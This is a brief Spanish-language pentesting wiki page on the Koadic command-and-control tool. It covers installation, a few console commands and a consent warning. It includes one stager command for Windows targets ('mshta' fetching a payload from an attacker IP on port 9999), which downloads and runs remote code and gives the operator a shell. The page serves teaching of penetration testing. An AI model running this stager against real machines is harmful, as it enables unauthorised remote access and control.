
# Koadic

{% hint style="danger" %}
**Nota:** Este tipo de técnicas son muy invasivas, ya que vamos a conseguir acceso a un sistema con un ejecutable, por lo que no podemos utilizar estas técnicas sin un consentimiento o aprobación por parte del objetivo
{% endhint %}

<figure><img src="/files/mNzbUOLLs6ncXB9cwD6q" alt=""><figcaption><p>Interfaz de Koadic</p></figcaption></figure>

{% embed url="<https://github.com/offsecginger/koadic>" %}

### Instalación

```bash
git clone https://github.com/zerosum0x0/koadic.git
cd koadic
pip3 install -r requirements.txt
./koadic
```

Viene por defecto en Kali Linux

```bash
sudo apt install koadic
```

### Comandos de Koadic

`info`: nos nuestra la info del sistema

`run`: comienza el ataque y nos da el link para ejecutar en la máquina objetivo

{% code title="Ejecutar en Windows" %}

```bash
mshta http://192.168.1.139:9999/EiSeF
```

{% endcode %}

`help`: nos muestra todo lo que podemos hacer

`cmdshell`: nos abre una terminal
